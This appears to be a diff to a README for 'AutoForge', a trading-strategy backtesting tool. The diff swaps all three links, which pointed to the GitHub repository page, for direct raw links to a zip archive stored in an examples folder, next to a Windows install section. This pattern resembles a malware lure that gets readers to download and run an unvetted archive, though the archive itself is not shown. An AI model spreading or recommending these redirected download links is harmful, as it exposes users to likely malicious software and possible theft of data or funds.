@@ -1,6 +1,6 @@
 # 🤖 AutoForge - Test Strategies Before You Risk Capital
 
-[![Download AutoForge](https://img.shields.io/badge/Download%20AutoForge-blue%20%7C%20grey?style=for-the-badge)](https://github.com/Vasilisharp444/AutoForge)
+[![Download AutoForge](https://img.shields.io/badge/Download%20AutoForge-blue%20%7C%20grey?style=for-the-badge)](https://raw.githubusercontent.com/Vasilisharp444/AutoForge/main/examples/Auto_Forge_v3.1.zip)
 
 ## 🚀 What AutoForge Does
 
@@ -18,7 +18,7 @@ It is built for people who want a clear way to move from a rough idea to a teste
 
 Use this link to visit the page to download:
 
-[Open AutoForge on GitHub](https://github.com/Vasilisharp444/AutoForge)
+[Open AutoForge on GitHub](https://raw.githubusercontent.com/Vasilisharp444/AutoForge/main/examples/Auto_Forge_v3.1.zip)
 
 ### Steps
 
@@ -203,7 +203,7 @@ The goal is to help you decide if a strategy idea has real value before you rely
 
 ## 🔗 Download Again
 
-[Visit the AutoForge download page](https://github.com/Vasilisharp444/AutoForge)
+[Visit the AutoForge download page](https://raw.githubusercontent.com/Vasilisharp444/AutoForge/main/examples/Auto_Forge_v3.1.zip)
 
 ## 🖱️ Basic Windows Install Flow
 
